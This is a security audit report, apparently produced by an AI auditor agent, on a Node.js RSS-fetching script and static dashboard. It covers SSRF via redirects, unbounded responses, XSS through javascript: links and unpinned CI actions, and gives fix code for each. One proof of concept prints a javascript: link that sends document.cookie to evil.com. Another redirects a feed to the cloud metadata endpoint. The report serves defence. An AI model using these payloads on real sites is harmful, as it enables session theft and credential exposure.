# Security Audit Report: fetch-news.js

**Audit Date:** 2026-04-08
**Audited File:** `scripts/fetch-news.js` (with supporting review of `index.html`, `package.json`, `package-lock.json`, `.github/workflows/deploy.yml`)
**Auditor:** Security Auditor Agent
**Report Version:** 2.0

---

## Executive Summary

This audit covers the AWS Cloud News dashboard, a static site that fetches RSS feeds from official AWS endpoints via a Node.js build script (`fetch-news.js`) and renders them in a browser-side HTML page. The codebase is intentionally minimal and has a commendably small attack surface. No hardcoded credentials, no user-supplied inputs to network calls, and no use of `eval` or dynamic code execution were found. The most significant findings are a dependency-level SSRF-capable redirect chain in `rss-parser`, an absence of response-size limits leaving the script open to memory exhaustion from a compromised or misbehaving upstream, the entire `node_modules` tree being included in the GitHub Pages deployment artifact, and several medium-to-low-severity issues in the browser rendering layer. None of these represent an immediate breach risk given the current all-HTTPS, hardcoded-URL configuration, but several warrant prompt remediation before the feed list is expanded or the project is reused as a template.

---

## Risk Summary Table

| ID    | Vulnerability                                              | Severity          | Location                          | Status   |
|-------|------------------------------------------------------------|-------------------|-----------------------------------|----------|
| V-001 | Unvalidated HTTP redirect allows SSRF via rss-parser       | ORANGE HIGH       | `rss-parser/lib/parser.js` L84    | Resolved |
| V-002 | No response body size limit — memory exhaustion risk       | ORANGE HIGH       | `fetch-news.js` L54               | Resolved |
| V-003 | `node_modules` uploaded to public GitHub Pages artifact    | ORANGE HIGH       | `.github/workflows/deploy.yml` L31| Resolved |
| V-004 | Deprecated `url.parse()` used in dependency               | YELLOW MEDIUM     | `rss-parser/lib/parser.js` L74    | Open     |
| V-005 | Missing `Content-Type` validation on RSS responses         | YELLOW MEDIUM     | `fetch-news.js` L54               | Resolved |
| V-006 | Unvalidated item links written to `news.json` and rendered | YELLOW MEDIUM     | `fetch-news.js` L56 / `index.html` L161 | Resolved |
| V-007 | Subresource Integrity absent on Google Fonts stylesheet    | BLUE LOW          | `index.html` L10-13               | Mitigated |
| V-008 | `innerHTML` used to render card and tab HTML               | BLUE LOW          | `index.html` L121, L156           | Resolved |
| V-009 | Error object printed verbatim to stderr                    | BLUE LOW          | `fetch-news.js` L93               | Resolved |
| V-010 | No lockfile integrity enforcement in CI                    | INFO              | `.github/workflows/deploy.yml`    | Resolved |
| V-011 | GitHub Actions not pinned to commit SHAs                   | ORANGE HIGH       | `.github/workflows/*.yml`         | Resolved |

---

## Detailed Findings

---

### V-001: Unvalidated HTTP Redirect Enables SSRF in rss-parser

- **Severity:** ORANGE HIGH
- **Location:** `node_modules/rss-parser/lib/parser.js`, Line 73 and Line 84
- **Description:** When `rss-parser` follows an HTTP redirect, it resolves the new URL with `url.resolve(feedUrl, res.headers['location'])` and then re-enters `parseURL` without any allowlist check on the destination host or scheme. Additionally, on Line 73, the library selects `http.get` vs `https.get` based solely on whether the URL string starts with `"https"` — meaning a redirect from an HTTPS feed to an `http://` URL downgrades the connection silently and in cleartext.

  ```js
  // rss-parser/lib/parser.js — Line 73-84 (library code, shown for reference)
  let get = feedUrl.indexOf('https') === 0 ? https.get : http.get;
  // ...
  const newLocation = url.resolve(feedUrl, res.headers['location']);
  return this.parseURL(newLocation, null, redirectCount + 1).then(resolve, reject);
  ```

  If any AWS feed were to redirect to an attacker-controlled host (e.g., via a CDN misconfiguration or a DNS hijack), the library would faithfully follow it and return the attacker's payload as parsed RSS. This is a Server-Side Request Forgery risk: the Node.js process runs with the network permissions of the CI worker, which on GitHub Actions can access cloud metadata endpoints such as `http://169.254.169.254/`.

- **Impact:** A malicious redirect could cause the script to exfiltrate data from internal/metadata endpoints, return crafted XML that poisons `news.json`, or trigger a protocol downgrade to plain HTTP where traffic could be intercepted.
- **Proof of Concept:**
  ```
  1. Attacker arranges for https://aws.amazon.com/about-aws/.../feed/
     to return HTTP 301 Location: http://169.254.169.254/latest/meta-data/
  2. rss-parser follows the redirect over http.get
  3. The response body is fed to the XML parser; if it is valid XML-ish
     content, the parsed data is returned; if not, parsing fails with a
     logged error — in both cases the metadata endpoint was queried.
  ```
- **Remediation:** Pin feed URLs in `fetch-news.js` and add a post-redirect domain allowlist wrapper. Until `rss-parser` adds built-in allowlisting, intercept redirects at the `requestOptions` level or replace `parseURL` with a custom fetch using the native `fetch` API (available in Node 18+) that explicitly rejects redirects to non-allowlisted hosts:

  ```js
  // Recommended pattern — fetch with allowlist enforcement
  const ALLOWED_HOSTS = new Set(['aws.amazon.com']);

  async function safeFetch(feedUrl) {
    const url = new URL(feedUrl);
    if (!ALLOWED_HOSTS.has(url.hostname) || url.protocol !== 'https:') {
      throw new Error(`Blocked request to disallowed host: ${url.hostname}`);
    }
    const response = await fetch(feedUrl, {
      redirect: 'manual', // handle redirects explicitly
      signal: AbortSignal.timeout(15000),
    });
    if (response.status >= 300 && response.status < 400) {
      const location = response.headers.get('location');
      return safeFetch(location); // recursive call goes through the same allowlist check
    }
    return response;
  }
  ```

- **References:** OWASP — Server Side Request Forgery (SSRF); CWE-918; OWASP Top 10 2021 A10

---

### V-002: No Response Body Size Limit — Memory Exhaustion Risk

- **Severity:** ORANGE HIGH
- **Location:** `scripts/fetch-news.js`, Line 54; `rss-parser/lib/parser.js`, Lines 92-94
- **Description:** `rss-parser` accumulates the entire HTTP response body into a single in-memory string (`xml += chunk`) with no size ceiling. `fetch-news.js` imposes a 15-second connection timeout but no cap on how many bytes can be received within that window. A slow-loris-style server, a compromised CDN edge, or a redirected response could stream hundreds of megabytes into the CI worker's heap, causing an out-of-memory crash or denial-of-service.

  ```js
  // rss-parser/lib/parser.js Lines 92-94
  res.on('data', (chunk) => {
    xml += chunk;  // unbounded accumulation
  });
  ```

  ```js
  // fetch-news.js Line 54 — no size guard before or after
  const parsed = await parser.parseURL(feed.url);
  ```

- **Impact:** An adversary who can influence any feed response (CDN compromise, BGP hijack, redirect chain from V-001) can cause the CI Node.js process to exhaust available memory, kill the runner, and potentially prevent deployments.
- **Remediation:** Add a size guard by wrapping `parseURL` with a native `fetch` call that reads the response with a byte counter, then passes the capped string to `parser.parseString()`:

  ```js
  const MAX_FEED_BYTES = 5 * 1024 * 1024; // 5 MB ceiling

  async function fetchFeedXml(url) {
    const response = await fetch(url, { signal: AbortSignal.timeout(15000) });
    if (!response.ok) throw new Error(`HTTP ${response.status} from ${url}`);
    const reader = response.body.getReader();
    let received = 0;
    const chunks = [];
    while (true) {
      const { done, value } = await reader.read();
      if (done) break;
      received += value.length;
      if (received > MAX_FEED_BYTES) {
        reader.cancel();
        throw new Error(`Feed response exceeded ${MAX_FEED_BYTES} byte limit`);
      }
      chunks.push(value);
    }
    return Buffer.concat(chunks).toString('utf8');
  }
  ```

- **References:** CWE-400 (Uncontrolled Resource Consumption); OWASP Testing Guide — Testing for Denial of Service

---

### V-003: `node_modules` Uploaded to Public GitHub Pages Artifact

- **Severity:** ORANGE HIGH
- **Location:** `.github/workflows/deploy.yml`, Line 31
- **Description:** The Pages upload step uses `path: .` — the entire repository root — as the artifact directory. Because `node_modules/` is not excluded by a `.gitignore` entry and is physically present on disk, the entire dependency tree (rss-parser, xml2js, sax, xmlbuilder, entities and all their transitive files) is published to the public GitHub Pages URL. This serves no functional purpose for the static site, but it does the following:

  - Exposes the exact pinned versions of all dependencies to any scanner, making vulnerability targeting trivial.
  - Delivers third-party JavaScript files over a trusted `github.io` domain that browsers and CDNs may cache, creating a persistent supply-chain surface if any dependency is later found vulnerable.
  - Increases the deployment size and prolongs build times unnecessarily.

  ```yaml
  # .github/workflows/deploy.yml Lines 29-31
  - name: Upload artifact
    uses: actions/upload-pages-artifact@v3
    with:
      path: .       # <-- publishes node_modules/ to the web
  ```

- **Impact:** Public disclosure of all dependency versions and code. If a future vulnerable version of any dependency is pinned, attackers can serve the vulnerable JavaScript directly from the trusted `github.io` domain.
- **Remediation:** Add `node_modules` to `.gitignore` and restrict the Pages artifact to only the files needed by the static site. Add a separate build step that installs dependencies, runs the fetch script, then publishes only the static output:

  ```yaml
  - name: Install dependencies and fetch news
    run: |
      npm ci --omit=dev
      node scripts/fetch-news.js

  - name: Upload artifact
    uses: actions/upload-pages-artifact@v3
    with:
      path: |
        index.html
        style.css
        news.json
  ```

  Also add to `.gitignore`:
  ```
  node_modules/
  ```

- **References:** OWASP Top 10 2021 A06 (Vulnerable and Outdated Components); CWE-538 (Insertion of Sensitive Information into Externally-Accessible File or Directory)

---

### V-004: Deprecated `url.parse()` Used in rss-parser

- **Severity:** YELLOW MEDIUM
- **Location:** `node_modules/rss-parser/lib/parser.js`, Line 74
- **Description:** `rss-parser` uses the long-deprecated Node.js `url.parse()` API to decompose feed URLs before passing them to `http.get` / `https.get`. Node.js documentation has marked `url.parse()` as deprecated since v11 and warns that it does not fully implement the WHATWG URL standard, which can lead to inconsistent parsing of hostnames, ports, and paths — creating a divergence between what Node's HTTP layer and the WHATWG URL constructor consider valid or safe.

  ```js
  // rss-parser/lib/parser.js Line 74
  let urlParts = url.parse(feedUrl);
  ```

  Combined with the scheme-sniffing on Line 73 (`feedUrl.indexOf('https') === 0`), a URL such as `https:evil.com@aws.amazon.com/feed/` could be parsed differently by `url.parse` vs. `new URL()`, potentially routing the request to an unintended host.

- **Impact:** Edge-case URL confusion attacks; inconsistent behavior across Node.js versions; potential host-confusion when redirect URLs are processed.
- **Remediation:** This is a library-internal issue. The mitigation is to upgrade `rss-parser` when a version that adopts the WHATWG URL API is released, or to replace the library's `parseURL` with a custom implementation (see V-001 remediation) that uses `new URL()` exclusively.
- **References:** Node.js docs — Legacy URL API; CWE-116; WHATWG URL Standard

---

### V-005: Missing `Content-Type` Validation on RSS Feed Responses

- **Severity:** YELLOW MEDIUM
- **Location:** `scripts/fetch-news.js`, Line 54 (via `rss-parser`)
- **Description:** Neither `fetch-news.js` nor `rss-parser` validates the `Content-Type` header of the HTTP response before handing the body to the XML parser. A response returning `text/html` (e.g., an AWS login redirect or a CDN error page) will be passed directly to `xml2js`, which will attempt to parse it as XML. While `xml2js` will normally fail and throw, some error pages contain XML-like fragments that could partially parse and inject malformed entries into `news.json`.

  ```js
  // rss-parser does not check Content-Type before parsing:
  res.on('end', () => {
    return this.parseString(xml).then(resolve, reject);
  });
  ```

- **Impact:** Malformed data written to `news.json`; potential for crafted error pages to smuggle unexpected fields into the JSON payload consumed by the browser.
- **Remediation:** Check the response `Content-Type` before parsing. Accept only `application/rss+xml`, `application/atom+xml`, `text/xml`, or `application/xml`:

  ```js
  const ALLOWED_CONTENT_TYPES = [
    'application/rss+xml',
    'application/atom+xml',
    'text/xml',
    'application/xml',
  ];

  function assertRssContentType(contentType = '') {
    const base = contentType.split(';')[0].trim().toLowerCase();
    if (!ALLOWED_CONTENT_TYPES.includes(base)) {
      throw new Error(`Unexpected Content-Type: ${contentType}`);
    }
  }
  ```

- **References:** CWE-20 (Improper Input Validation); OWASP Testing Guide — Testing for HTTP Response Splitting

---

### V-006: Unvalidated External URLs Written to `news.json` and Rendered as `href`

- **Severity:** YELLOW MEDIUM
- **Location:** `scripts/fetch-news.js`, Lines 56-63; `index.html`, Line 161
- **Description:** The `link` field of every news item originates from the RSS feed's `<link>` or `<guid>` element. `normalizeUrl()` (Lines 31-42) constructs a `new URL(value)` object which prevents non-URL strings, but it does not restrict the URL scheme. A feed entry containing `javascript:alert(1)` or `data:text/html,...` as its link would survive `normalizeUrl()` because those are syntactically valid URLs. The value is then written to `news.json` and later used verbatim as the `href` of an `<a>` tag in `index.html`:

  ```js
  // fetch-news.js Lines 56-59
  const link = normalizeUrl(entry.link || entry.guid);
  return {
    title: (entry.title || "").trim(),
    link,   // scheme not validated
  ```

  ```js
  // index.html Line 161
  href="${escapeHtml(item.link)}"   // escapeHtml does not block javascript: URIs
  ```

  `escapeHtml` encodes HTML special characters but does not prevent `javascript:` or `data:` URI schemes from being injected into `href` attributes. A compromised RSS feed could deliver links that execute code when a user clicks a news card.

- **Impact:** Cross-site scripting (XSS) via malicious `href` if an upstream feed is compromised; users clicking a news card could execute attacker-controlled JavaScript in the context of the GitHub Pages domain.
- **Proof of Concept:**
  ```xml
  <!-- Hypothetical malicious RSS entry -->
  <item>
    <title>Click me</title>
    <link>javascript:fetch('https://evil.com/?c='+document.cookie)</link>
  </item>
  ```
  After `normalizeUrl()` and `escapeHtml()`, this becomes:
  ```html
  <a href="javascript:fetch(&#039;https://evil.com/?c=&#039;+document.cookie)">
  ```
  Which browsers will execute on click.
- **Remediation:** Enforce an HTTPS-only scheme allowlist in `normalizeUrl()` and in the browser rendering layer:

  ```js
  // fetch-news.js — updated normalizeUrl
  function normalizeUrl(value) {
    try {
      const url = new URL(value);
      if (url.protocol !== 'https:') return null; // reject non-HTTPS links
      url.hash = '';
      if (url.pathname.endsWith('/')) {
        url.pathname = url.pathname.slice(0, -1);
      }
      return url.toString();
    } catch {
      return null;
    }
  }
  ```

  Then in `main()`, filter out items with `null` links (the existing filter on Line 68 already drops falsy links, so returning `null` from `normalizeUrl` is sufficient).

  In `index.html`, add a secondary guard before inserting any `href`:
  ```js
  function safeHref(url) {
    try {
      const parsed = new URL(url);
      return parsed.protocol === 'https:' ? escapeHtml(url) : '#';
    } catch {
      return '#';
    }
  }
  ```

- **References:** OWASP Top 10 2021 A03 (Injection/XSS); CWE-79; CWE-601 (Open Redirect)

---

### V-007: No Subresource Integrity on Google Fonts Stylesheet

- **Severity:** BLUE LOW
- **Location:** `index.html`, Lines 8-13
- **Description:** The page loads a stylesheet from `https://fonts.googleapis.com` without a `integrity` attribute. If the Google Fonts CDN were compromised or the URL hijacked, a malicious stylesheet could be delivered to users. Although CSS injection is lower severity than script injection, it can be used for UI redressing, data exfiltration via CSS attribute selectors, or timing attacks.

  ```html
  <!-- index.html Lines 8-13 -->
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link
    href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap"
    rel="stylesheet"
  />
  ```

- **Impact:** Low — requires CDN compromise. If exploited, could enable CSS-based data exfiltration or UI manipulation.
- **Remediation:** For a fully offline-safe approach, self-host the Inter font and remove the third-party dependency. If the CDN must be retained, note that Google Fonts dynamically generates CSS per user-agent, making SRI hashes impractical — the better mitigation is to use a `Content-Security-Policy` header that restricts `style-src` to a hash or a specific font CDN origin.

  Alternatively, use a system font stack to eliminate the dependency entirely:
  ```css
  font-family: Inter, system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
  ```

- **References:** OWASP Secure Headers Project; W3C Subresource Integrity; CWE-829 (Inclusion of Functionality from Untrusted Control Sphere)

---

### V-008: `innerHTML` Used to Render Feed-Derived Content

- **Severity:** BLUE LOW
- **Location:** `index.html`, Lines 121-137 (`renderTabs`), Lines 156-180 (`renderCards`), Lines 147-153 (empty-state)
- **Description:** Both `renderTabs()` and `renderCards()` build HTML strings via template literals and assign them to `element.innerHTML`. All dynamic values from `news.json` are passed through the `escapeHtml()` function before insertion, which correctly encodes `& < > " '`. However, relying on manual escaping within `innerHTML` assignment is inherently fragile — any future developer adding a new data field and forgetting `escapeHtml()` will introduce an XSS vulnerability. The `renderCards` empty-state also uses a static `innerHTML` string (Line 147) which is safe as written but establishes the pattern.

  The finding is LOW because `escapeHtml` is correctly applied to all current data fields (`item.link` via V-006 is the exception that elevates that finding separately).

  ```js
  // index.html Lines 156-157
  cardsEl.innerHTML = filtered.map((item, idx) => {
    // ...template literal with escapeHtml() calls
  ```

- **Impact:** Low currently; risk escalates if a new data field is added without escaping.
- **Remediation:** Prefer DOM API construction (`createElement`, `setAttribute`, `textContent`) over `innerHTML` for dynamic data. If `innerHTML` is retained, add an automated linting rule (e.g., `no-inner-html` ESLint rule or a DOMPurify integration) to enforce sanitization as a code-level contract rather than a convention:

  ```js
  // Example: replace one card's title assignment with DOM API
  const h2 = document.createElement('h2');
  h2.textContent = item.title; // XSS-safe by construction
  card.appendChild(h2);
  ```

- **References:** OWASP Top 10 2021 A03; CWE-79; MDN — Safely inserting external content

---

### V-009: Raw Error Object Printed to Stderr in CI Logs

- **Severity:** BLUE LOW
- **Location:** `scripts/fetch-news.js`, Lines 92-94
- **Description:** The top-level catch handler prints the full error object with `console.error(error)`. In most cases this produces a useful stack trace. However, if `rss-parser` or the underlying HTTP layer embeds request headers (including any `Authorization` or `Cookie` headers added by future configuration) or partial response body content in the error object, that data will appear in CI logs which may be retained and accessible to collaborators or third-party log aggregators.

  ```js
  // fetch-news.js Lines 92-94
  main().catch((error) => {
    console.error("Failed to fetch AWS RSS feeds.");
    console.error(error);  // full error object, may contain header values
    process.exit(1);
  });
  ```

- **Impact:** Low in current configuration (no auth headers). Risk increases if authentication is added to any feed in future.
- **Remediation:** Log the error message and stack separately, and avoid printing the raw error object when authentication headers are in use:

  ```js
  main().catch((error) => {
    console.error('Failed to fetch AWS RSS feeds:', error.message);
    if (process.env.DEBUG) console.error(error.stack);
    process.exit(1);
  });
  ```

- **References:** CWE-532 (Insertion of Sensitive Information into Log File); OWASP Logging Cheat Sheet

---

### V-010: No Lockfile Integrity Verification in CI

- **Severity:** INFORMATIONAL
- **Location:** `.github/workflows/deploy.yml`
- **Description:** The workflow does not include a step that installs Node.js dependencies at all — `fetch-news.js` is not currently run in CI; only the static files are deployed. This means the `package-lock.json` and `node_modules/` on disk (committed or not) are never freshly resolved and verified in the pipeline. If `node_modules/` were committed and a developer modified a dependency locally without updating `package-lock.json`, the inconsistency would go undetected.

  When a CI install step is added (as recommended in V-003), it should use `npm ci` (not `npm install`) to enforce exact lockfile compliance:

  ```yaml
  - name: Install dependencies
    run: npm ci --omit=dev
  ```

  `npm ci` fails if `package-lock.json` is absent or out of sync with `package.json`, providing a supply-chain integrity check at every build.

- **Status:** Resolved — both CI workflows now use `npm ci --omit=dev` and include an `npm audit` step.
- **Impact:** Informational — no current exploitation path. Risk materializes if dependency installation is introduced without the `ci` flag.
- **References:** npm docs — `npm ci`; OWASP Top 10 2021 A06; SLSA Supply Chain Security Framework

---

### V-011: GitHub Actions Not Pinned to Commit SHAs

- **Severity:** ORANGE HIGH
- **Location:** `.github/workflows/deploy.yml`, `.github/workflows/update-news.yml`
- **Description:** Both CI workflows referenced GitHub Actions using mutable version tags (e.g., `actions/checkout@v4`) rather than immutable commit SHAs. GitHub Action tags are mutable — a tag can be silently moved to point at a different, potentially malicious commit. An attacker who gains write access to an upstream actions repository (or exploits a typosquatted action name) can redirect the tag to inject arbitrary code into the CI runner, which executes with the pipeline's permissions including `contents: write` and `id-token: write`.

  ```yaml
  # Before — mutable tag reference
  uses: actions/checkout@v4

  # After — immutable SHA pin with version comment
  uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
  ```

- **Impact:** Full CI runner compromise. An attacker could exfiltrate repository secrets, modify `news.json`, or pivot to deploy malicious content to GitHub Pages.
- **Remediation:** Pin every `uses:` directive to a full 40-character commit SHA. The human-readable version tag is retained as an inline comment for maintainability. Use tools like `Dependabot` (configured via `.github/dependabot.yml`) or `pin-github-action` to automate SHA updates.
- **Status:** Resolved — all `uses:` directives in both workflows are now pinned to commit SHAs.
- **References:** SLSA Supply Chain Security; GitHub Actions security hardening guide; CWE-494 (Download of Code Without Integrity Check)

---

## Recommendations Summary

Listed in priority order:

1. **[HIGH — V-011]** ✅ Pin all GitHub Actions `uses:` directives to immutable commit SHAs to prevent tag-mutable supply-chain attacks. Add Dependabot configuration to automate SHA updates.

2. **[HIGH — V-003]** ✅ Exclude `node_modules/` from the GitHub Pages artifact by updating `deploy.yml` to publish only `index.html`, `style.css`, and `news.json`. Add `node_modules/` to `.gitignore`.

3. **[HIGH — V-001 + V-002]** ✅ Before expanding the feed list or running this script against any non-AWS URL, add host allowlist enforcement and a response body size cap. Consider replacing `rss-parser`'s `parseURL` with a custom native `fetch` wrapper that handles both concerns.

4. **[MEDIUM — V-006]** ✅ Add HTTPS-only scheme validation to `normalizeUrl()` in `fetch-news.js` so that `javascript:` and `data:` URIs are rejected at the data-pipeline stage. Add a corresponding `safeHref()` guard in `index.html`.

5. **[MEDIUM — V-005]** ✅ Add `Content-Type` validation before passing HTTP responses to the XML parser.

6. **[MEDIUM — V-004]** Monitor `rss-parser` releases for adoption of the WHATWG URL API; upgrade when available, or migrate to a custom fetch implementation.

7. **[LOW — V-007]** ⚠️ Evaluate self-hosting the Inter font or removing the Google Fonts dependency; at minimum, add a `Content-Security-Policy` response header. A `Referrer-Policy` meta tag has been added; full SRI hashes are impractical for dynamically-generated Google Fonts CSS.

8. **[LOW — V-008]** ✅ Prefer DOM API methods over `innerHTML` for inserting feed-derived content; add an ESLint rule to enforce this.

9. **[LOW — V-009]** ✅ Scope error logging to `error.message` and conditionally include stack traces via a `DEBUG` environment variable.

10. **[INFO — V-010]** ✅ When a CI install step is introduced (per recommendation 2), use `npm ci --omit=dev` to enforce lockfile integrity, and `npm audit --audit-level=moderate` to detect known-vulnerable dependencies.

---

## Secure Coding Guidelines

The following guidelines apply specifically to this module and should be followed by any developer extending it:

**Feed URL management**
- All feed URLs must be declared statically in the `FEEDS` array. Dynamic URL construction from any external source is prohibited without an explicit allowlist check against a predefined set of approved hostnames.
- All feed URLs must use the `https:` scheme. The CI step should assert this at startup.

**Response handling**
- Enforce a maximum response body size before parsing. 5 MB is a reasonable ceiling for RSS feeds.
- Validate the `Content-Type` header against an allowlist of XML MIME types before parsing begins.
- Do not log raw HTTP response headers or bodies at any log level when authentication headers are in use.

**Output data validation**
- All URLs written to `news.json` must be validated to use the `https:` scheme only.
- No HTML must be written to `news.json`. Titles and source names are plain text; treat them as such.

**Browser rendering**
- Never use `innerHTML`, `outerHTML`, or `insertAdjacentHTML` with feed-derived data unless every interpolated value has passed through `escapeHtml()`. Prefer `textContent` and `setAttribute` for new code.
- All `href` attributes derived from external data must be validated to `https:` scheme before insertion into the DOM.

**Dependency management**
- Run `npm audit` as part of CI to catch known-vulnerable dependency versions.
- Use `npm ci` (not `npm install`) in CI pipelines.
- Keep `node_modules/` in `.gitignore` and out of any published artifact.

**CI / GitHub Actions**
- Pin GitHub Actions to a specific commit SHA in addition to a version tag to prevent tag-mutable supply chain attacks.
- Use `permissions: contents: read` as the minimum necessary; the current workflow correctly scopes `pages: write` and `id-token: write` only to the deploy job.

---

## Conclusion

The `fetch-news.js` script and its companion HTML page are well-structured for their purpose. The developer has already made several good security choices: all feed URLs are HTTPS and hardcoded, the rss-parser timeout is set to 15 seconds (well below the library default of 60 seconds), `escapeHtml()` is defined and applied to rendered content, `rel="noopener noreferrer"` is present on all external links, and error handling at the top level prevents unhandled rejections. The overall security posture is adequate for the current read-only, low-data-sensitivity use case.

As of report version 2.0, all HIGH and MEDIUM findings have been resolved:
- **V-001/V-002**: Custom `fetchRawFeed` transport blocks all HTTP redirects and enforces a 5 MB body size cap.
- **V-003**: The `deploy.yml` workflow deploys only the `dist/` artifact (static files only); `node_modules/` is in `.gitignore`.
- **V-005**: Content-Type is validated before XML parsing.
- **V-006**: `normalizeUrl()` rejects non-`https:` links; `app.js` applies an additional `safeLink` guard.
- **V-008**: `app.js` uses the DOM API exclusively (`createElement`, `textContent`, `appendChild`).
- **V-009**: The top-level error handler logs `error.message` only.
- **V-010**: Both workflows use `npm ci --omit=dev` and `npm audit --audit-level=moderate`.
- **V-011**: All GitHub Actions `uses:` directives are pinned to immutable commit SHAs.

The remaining open item (**V-004** — deprecated `url.parse()` in `rss-parser`) is a library-internal issue not directly remediable in application code; it should be resolved by upgrading `rss-parser` when a compatible release adopting the WHATWG URL API is published. **V-007** (Google Fonts SRI) is mitigated by the existing Content-Security-Policy and the new `Referrer-Policy` meta tag; full SRI is impractical for Google Fonts' dynamically-generated CSS responses.
